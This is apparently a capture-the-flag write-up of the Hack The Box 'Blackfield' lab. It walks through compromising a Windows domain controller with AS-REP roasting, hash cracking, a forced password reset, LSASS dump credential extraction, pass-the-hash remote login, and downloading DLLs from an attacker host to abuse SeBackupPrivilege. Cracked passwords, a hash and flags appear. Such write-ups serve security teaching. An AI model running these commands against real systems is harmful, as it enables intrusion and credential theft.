# Notes

Domain: **BLACKFIELD.LOCAL**

Shares:
- ADMIN$
- C$
- forensic: **audit2020**
- IPC$
- NETLOGON
- profiles$: **Anonymous**
- SYSVOL

Usernames: 
- **audit2020:#00^BlackKnight**
- **support:ASDqwe123**
- **svc_backup:9658d1d1dcd9250115e2205d9f48400d**

# Enumeration

## Nmap

```bash
sudo nmap -vv -sC -sV -p- -oA  nmap/BlackField 10.10.10.192


# Nmap 7.91 scan initiated Wed Mar 24 13:22:12 2021 as: nmap -vv -sC -sV -oA nmap/BlackField 10.10.10.192
Nmap scan report for blackfield (10.10.10.192)
Host is up, received echo-reply ttl 127 (0.040s latency).
Scanned at 2021-03-24 13:22:13 EDT for 56s
Not shown: 993 filtered ports
Reason: 993 no-responses
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2021-03-25 01:22:26Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 8h00m00s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 48702/tcp): CLEAN (Timeout)
|   Check 2 (port 59965/tcp): CLEAN (Timeout)
|   Check 3 (port 4305/udp): CLEAN (Timeout)
|   Check 4 (port 53637/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-03-25T01:22:33
|_  start_date: N/A

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Mar 24 13:23:09 2021 -- 1 IP address (1 host up) scanned in 56.84 seconds
                                                                                                   
```

Nothing out of the ordinary, we can conclude the computer is a simple domain controller.

## LDAPSearch

```bash

┌──(kali㉿kali)-[~/HTB/BlackField]                                           
└─$ ldapsearch -LLL -x -H ldap://blackfield.local -b '' -s base '(objectclass=\*)' > out

┌──(kali㉿kali)-[~/HTB/BlackField]                                           
└─$ cat ldap.out                                                                                                   
dn:                                                                  
domainFunctionality: 7                                                                                               
forestFunctionality: 7                                                                                               
domainControllerFunctionality: 7                                                                                     
rootDomainNamingContext: DC=BLACKFIELD,DC=local                                                                      
ldapServiceName: BLACKFIELD.local:dc01$@BLACKFIELD.LOCAL                                                             
isGlobalCatalogReady: TRUE                                                                                           
supportedSASLMechanisms: GSSAPI                                                                                      
supportedSASLMechanisms: GSS-SPNEGO                                                                                  
supportedSASLMechanisms: EXTERNAL                                                                                    
supportedSASLMechanisms: DIGEST-MD5                                                                                  
supportedLDAPVersion: 3                                                                                              
supportedLDAPVersion: 2                                                                                              
supportedLDAPPolicies: MaxPoolThreads                                                                                
supportedLDAPPolicies: MaxPercentDirSyncRequests                                                                     
supportedLDAPPolicies: MaxDatagramRecv                                                                               
supportedLDAPPolicies: MaxReceiveBuffer                                                                              
supportedLDAPPolicies: InitRecvTimeout                                                                               
supportedLDAPPolicies: MaxConnections                                                                                
supportedLDAPPolicies: MaxConnIdleTime                                                                               
supportedLDAPPolicies: MaxPageSize                                                                                   
supportedLDAPPolicies: MaxBatchReturnMessages                                                                        
supportedLDAPPolicies: MaxQueryDuration                                                                              
supportedLDAPPolicies: MaxDirSyncDuration                                                                            
supportedLDAPPolicies: MaxTempTableSize                                                                              
supportedLDAPPolicies: MaxResultSetSize                                                                              
supportedLDAPPolicies: MinResultSets                                                                                 
supportedLDAPPolicies: MaxResultSetsPerConn                                                                          
supportedLDAPPolicies: MaxNotificationPerConn                                                                        
supportedLDAPPolicies: MaxValRange                                                                                   
supportedLDAPPolicies: MaxValRangeTransitive                                                                         
supportedLDAPPolicies: ThreadMemoryLimit                                                                             
supportedLDAPPolicies: SystemMemoryLimitPercent   
subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=BLACKFIELD,DC=local                 serverName: CN=DC01,CN=Servers,CN=Default-First-SiteName,CN=Sites,CN=Configuration,DC=BLACKFIELD,DC=local           
schemaNamingContext: CN=Schema,CN=Configuration,DC=BLACKFIELD,DC=local
namingContexts: DC=BLACKFIELD,DC=local  
namingContexts: CN=Configuration,DC=BLACKFIELD,DC=local
namingContexts: CN=Schema,CN=Configuration,DC=BLACKFIELD,DC=local
namingContexts: DC=DomainDnsZones,DC=BLACKFIELD,DC=local
namingContexts: DC=ForestDnsZones,DC=BLACKFIELD,DC=local
isSynchronized: TRUE                                      
highestCommittedUSN: 217207                               
dsServiceName: CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=BLACKFIELD,DC=local
dnsHostName: DC01.BLACKFIELD.local       
defaultNamingContext: DC=BLACKFIELD,DC=local
currentTime: 20210325013817.0Z           
configurationNamingContext: CN=Configuration,DC=BLACKFIELD,DC=local
```

Nothing interesting


## SMB
### SMBClient

```bash
┌──(kali㉿kali)-[~/HTB/BlackField]
└─$ smbclient -L //10.10.10.192/   
Enter WORKGROUP\kali's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        forensic        Disk      Forensic / Audit share.
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        profiles$       Disk      
        SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available

```

**profiles$** can be read without user:
It contains folders named after people.

# Initial Foothold
## kerbrute

We can use Kerberos pre-auth to verify if the users are valid, we use kerbrute on all of the profiles found in the smb share and get the 3 valid ones.

```bash
┌──(kali㉿kali)-[~/HTB/BlackField]
└─$ kerbrute userenum users  --dc 10.10.10.192 -d blackfield.local  

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 03/24/21 - Ronnie Flathers @ropnop

2021/03/24 13:59:55 >  Using KDC(s):
2021/03/24 13:59:55 >   10.10.10.192:88

2021/03/24 14:00:16 >  [+] VALID USERNAME:       audit2020@blackfield.local
2021/03/24 14:02:09 >  [+] VALID USERNAME:       support@blackfield.local
2021/03/24 14:02:14 >  [+] VALID USERNAME:       svc_backup@blackfield.local
2021/03/24 14:02:39 >  Done! Tested 314 usernames (3 valid) in 164.349 seconds
```

## GetNPUsers.py

We can try [ASREPRoast](https://book.hacktricks.xyz/windows/active-directory-methodology/asreproast), if one of the account has the [DONT_REQ_PREAUTH](https://support.microsoft.com/en-us/help/305144/how-to-use-the-useraccountcontrol-flags-to-manipulate-user-account-pro) attribute, we can get a hash and try to bruteforce it offline.

```bash
┌──(kali㉿kali)-[~/HTB/BlackField]
└─$ python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py blackfield.local/ -usersfile verified_users -format hashcat -outputfile hashes.asreproast

┌──(kali㉿kali)-[~/HTB/BlackField]
└─$ cat hashes.asreproast   
$krb5asrep$23$support@BLACKFIELD.LOCAL:e631911bd8cdf8e762e8077c58f5bd92$a909a362320f09f366921bfe15bf713e94c155a3281c6b64c1e79d346fccb8d20ba061e1de29571bc5d101faf64b5e54f2bec1ffbb19332e3e5aedf33e74631e24742fd011396f682d70683241b65da6e7b7237a661fc50eff608b1fc5f082e83e473bed0d43ceba97a432a8620199091a73d99f38bb2b949bffa9e1ef3d777f4dba7ad624dc3a3bdb3f847902f078ff06648bc758277dea25084f1e5254094b7835be0270501a0932d7626752e8f72606662e9bcaab8481a50d4ea18e69bd5339cbffd983b1655953527cdb0508ce1728fdeb815bb17f3798214475b5762987368ef6ce7e1b15e15b12d7cef34398f2a5f33c86

```

## Hashcat

```bash
┌──(kali㉿kali)-[~/HTB/BlackField]
└─$ hashcat --example-hash | grep krb5asrep -B 5       
HASH: 597056:3600                                         
PASS: hashcat                                             

MODE: 18200                                               
TYPE: Kerberos 5, etype 23, AS-REP
HASH: $krb5asrep$23$user@domain.com:3e156ada591263b8aab0965f5aebd837$007497cb51b6c8116d6407a782ea0e1c5402b17db7afa6b05a6d30ed164a9933c754d720e279c6c573679bd27128fe77e5fea1f72334c1193c8ff0b370fadc6368bf2d49bbfdba4c5dccab95e8c8ebfdc75f43
8a0797dbfb2f8a1a5f4c423f9bfc1fea483342a11bd56a216f4d5158ccc4b224b52894fadfba3957dfe4b6b8f5f9f9fe422811a314768673e0c924340b8ccb84775ce9defaa3baa0910b676ad0036d13032b0dd94e3b13903cc738a7b6d00b0b3c210d1f972a6c7cae9bd3c959acf7565be528fc179
118f28c679f6deeee1456f0781eb8154e18e49cb27b64bf74cd7112a0ebae2102ac  

┌──(kali㉿kali)-[~/HTB/BlackField]                                                                                                                                                                                                         
└─$ hashcat -m 18200 -o support_pass -a 0 hashes.asreproast /usr/share/wordlists/rockyou.txt                                                                                                                                         
hashcat (v6.1.1) starting...                              

OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i7-2600K CPU @ 3.40GHz, 2880/2944 MB (1024 MB allocatable), 4MCU              

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates                                         
Rules: 1                                                  

Applicable optimizers applied:
* Zero-Byte                                               
* Not-Iterated                                            
* Single-Hash                                             
* Single-Salt                                             

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.           
If you want to switch to optimized backend kernels, append -O to your commandline.                                   
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.                                                    
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 134 MB

Dictionary cache built:                                   
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392                                    
* Bytes.....: 139921507                                   
* Keyspace..: 14344385                                    
* Runtime...: 5 secs                                      

                                                  
Session..........: hashcat                                
Status...........: Cracked                                
Hash.Name........: Kerberos 5, etype 23, AS-REP
Hash.Target......: $krb5asrep$23$support@BLACKFIELD.LOCAL:e631911bd8cd...f33c86                                      
Time.Started.....: Wed Mar 24 15:28:30 2021 (20 secs)
Time.Estimated...: Wed Mar 24 15:28:50 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)                                                           
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   743.8 kH/s (10.66ms) @ Accel:64 Loops:1 Thr:64 Vec:8                                            
Recovered........: 1/1 (100.00%) Digests
Progress.........: 14336000/14344385 (99.94%)
Rejected.........: 0/14336000 (0.00%)
Restore.Point....: 14319616/14344385 (99.83%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: (Muffin) -> #!hrvert

Started: Wed Mar 24 15:27:57 2021
Stopped: Wed Mar 24 15:28:51 2021


┌──(kali㉿kali)-[~/HTB/BlackField]
└─$ cat support_pass                                                                                                 
$krb5asrep$23$support@BLACKFIELD.LOCAL:e631911bd8cdf8e762e8077c58f5bd92$a909a362320f09f366921bfe15bf713e94c155a3281c6b64c1e79d346fccb8d20ba061e1de29571bc5d101faf64b5e54f2bec1ffbb19332e3e5aedf33e74631e24742fd011396f682d70683241b65da6e7b
7237a661fc50eff608b1fc5f082e83e473bed0d43ceba97a432a8620199091a73d99f38bb2b949bffa9e1ef3d777f4dba7ad624dc3a3bdb3f847902f078ff06648bc758277dea25084f1e5254094b7835be0270501a0932d7626752e8f72606662e9bcaab8481a50d4ea18e69bd5339cbffd983b165
5953527cdb0508ce1728fdeb815bb17f3798214475b5762987368ef6ce7e1b15e15b12d7cef34398f2a5f33c86:#00^BlackKnight
```

# Lateral Movement

## support->audit2020

### Audit2020 password reset

The support account name suggests the account is used for administrative purposes, we try and see if we can reset the other users passwords with rpc client.

```bash
┌──(kali㉿kali)-[~/HTB/BlackField]                                   
└─$ rpcclient -U "support" //10.10.10.192

rpcclient $> setuserinfo2 audit2020 23 'ASDqwe123' 
```

It works for **audit2020**

## audit2020->svc_backup

### SMB

The **forensic** share can be read:

```bash
┌──(kali㉿kali)-[~/HTB/BlackField/SMB/forensic]
└─$ ls */*         
commands_output/domain_admins.txt   commands_output/netstat.txt     memory_analysis/ctfmon.zip   memory_analysis/lsass.zip          memory_analysis/ServerManager.zip  memory_analysis/taskhostw.zip
commands_output/domain_groups.txt   commands_output/route.txt       memory_analysis/dfsrs.zip    memory_analysis/mmc.zip            memory_analysis/sihost.zip         memory_analysis/winlogon.zip
commands_output/domain_users.txt    commands_output/systeminfo.txt  memory_analysis/dllhost.zip  memory_analysis/pypykatz.exe       memory_analysis/smartscreen.zip    memory_analysis/wlms.zip
commands_output/firewall_rules.txt  commands_output/tasklist.txt    memory_analysis/ismserv.zip  memory_analysis/pypykatz.zip       memory_analysis/svc_backup_hash    memory_analysis/WmiPrvSE.zip
commands_output/ipconfig.txt        memory_analysis/conhost.zip     memory_analysis/lsass.DMP    memory_analysis/RuntimeBroker.zip  memory_analysis/svchost.zip

tools/sleuthkit-4.8.0-win32:
bin  lib  licenses  NEWS.txt  README.txt  README-win32.txt

tools/sysinternals:
accesschk64.exe  Autoruns.exe      ctrl2cap.nt5.sys  efsdump.exe      livekd.exe           ntfsinfo.exe     procexp.exe     pslist64.exe      pssuspend.exe     sigcheck64.exe  Testlimit64.exe
accesschk.exe    Bginfo64.exe      Dbgview.chm       Eula.txt         LoadOrd64.exe        pagedfrg.exe     Procmon64.exe   pslist.exe        Pstools.chm       sigcheck.exe    Testlimit.exe
AccessEnum.exe   Bginfo.exe        Dbgview.exe       FindLinks64.exe  LoadOrdC64.exe       pagedfrg.hlp     procmon.chm     PsLoggedon64.exe  psversion.txt     streams64.exe   Vmmap.chm
AdExplorer.chm   Cacheset.exe      Desktops.exe      FindLinks.exe    LoadOrdC.exe         pendmoves64.exe  Procmon.exe     PsLoggedon.exe    RAMMap.exe        streams.exe     vmmap.exe
ADExplorer.exe   Clockres64.exe    Disk2vhd.chm      handle64.exe     LoadOrd.exe          pendmoves.exe    PsExec64.exe    psloglist64.exe   readme.txt        strings64.exe   Volumeid64.exe
ADInsight.chm    Clockres.exe      disk2vhd.exe      handle.exe       logonsessions64.exe  pipelist64.exe   PsExec.exe      psloglist.exe     RegDelNull64.exe  strings.exe     Volumeid.exe
ADInsight.exe    Contig64.exe      diskext64.exe     hex2dec64.exe    logonsessions.exe    pipelist.exe     psfile64.exe    pspasswd64.exe    RegDelNull.exe    sync64.exe      whois64.exe
adrestore.exe    Contig.exe        diskext.exe       hex2dec.exe      movefile64.exe       PORTMON.CNT      psfile.exe      pspasswd.exe      regjump.exe       sync.exe        whois.exe
Autologon.exe    Coreinfo.exe      Diskmon.exe       junction64.exe   movefile.exe         portmon.exe      PsGetsid64.exe  psping64.exe      ru64.exe          Sysmon64.exe    Winobj.exe
Autoruns64.dll   CPUSTRES64.EXE    DISKMON.HLP       junction.exe     notmyfault64.exe     PORTMON.HLP      PsGetsid.exe    psping.exe        ru.exe            Sysmon.exe      WINOBJ.HLP
Autoruns64.exe   CPUSTRES.EXE      DiskView.exe      ldmdump.exe      notmyfaultc64.exe    procdump64.exe   PsInfo64.exe    PsService64.exe   sdelete64.exe     Tcpvcon.exe     ZoomIt.exe
autorunsc64.exe  ctrl2cap.amd.sys  DMON.SYS          Listdlls64.exe   notmyfaultc.exe      procdump.exe     PsInfo.exe      PsService.exe     sdelete.exe       tcpview.chm
autorunsc.exe    ctrl2cap.exe      du64.exe          Listdlls.exe     notmyfault.exe       procexp64.exe    pskill64.exe    psshutdown.exe    ShareEnum.exe     Tcpview.exe
autoruns.chm     ctrl2cap.nt4.sys  du.exe            livekd64.exe     ntfsinfo64.exe       procexp.chm      pskill.exe      pssuspend64.exe   ShellRunas.exe    TCPVIEW.HLP

tools/volatility:
AUTHORS.txt  CHANGELOG.txt  contrib  CREDITS.txt  LEGAL.txt  LICENSE.txt  Makefile  MANIFEST.in  PKG-INFO  pyinstaller  pyinstaller.spec  README.txt  resources  setup.py  tools  volatility  vol.py
```

It contains result from an audit, a file immediatly catches my eye, lsass.DMP which, as it names indicates, contains a dump of lsass.exe, we should be able to use Mimikatz to retrieve logged in user hashes.

### LSASS

```PowerShell
PS C:\Users\Emanone\HTB\blackfield > .\pypykatz\pypykatz.exe lsa minidump .\lsass.DMP > out

```

We use svc_backup hash to login with evil-winrm

```bash
┌──(kali㉿kali)-[~/HTB/BlackField]
└─$ evil-winrm-2.4/evil-winrm.rb -u svc_backup -H $(cat svc_backup_hash) -i 10.10.10.192                                                                                                                     

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc_backup\Documents> 
```

We can now retrieve user.txt

```PowerShell
*Evil-WinRM* PS C:\Users\svc_backup\Desktop> dir


    Directory: C:\Users\svc_backup\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        3/24/2021   6:13 PM             34 user.txt


*Evil-WinRM* PS C:\Users\svc_backup\Desktop> cat user.txt
e37920947199bab3ed28a7e6abeef66e

```

# Privesc 
## Enum

Privesc scripts does not work, fortunately we don't really need them as a permission stands up in simple manual enumeration:

```PowerShell
*Evil-WinRM* PS C:\Users\svc_backup\Documents> whoami /all

USER INFORMATION
----------------

User Name             SID
===================== ==============================================
blackfield\svc_backup S-1-5-21-4194615774-2175524697-3563712290-1413


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege         	  Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

We have *SeBackupPrivilege* -> We can copy any file

## Exploitation

We use [this technique](https://github.com/giuliano108/SeBackupPrivilege) to give ourselves the SeBackupPrivilege right and to copy any file.

```PowerShell
*Evil-WinRM* PS C:\Users\svc_backup\Documents> wget http://10.10.16.144/cmdlet.dll -o cmdlet.dll                                                                                                                 
*Evil-WinRM* PS C:\Users\svc_backup\Documents> wget http://10.10.16.144/backup.dll -o backup.dll                                                                                                                 
*Evil-WinRM* PS C:\Users\svc_backup\Documents> Import-Module .\backup.dll       
*Evil-WinRM* PS C:\Users\svc_backup\Documents> Import-Module .\cmdlet.dll

*Evil-WinRM* PS C:\Users\svc_backup\Documents> Set-SeBackupPrivilege

*Evil-WinRM* PS C:\Users\svc_backup\Documents> Copy-FileSeBackupPrivilege C:\Users\Administrator\Desktop\root.txt .\root.txt

*Evil-WinRM* PS C:\Users\svc_backup\Documents> cat root.txt
9534f4e228835cdba9599638c146806c
```

PWNED !

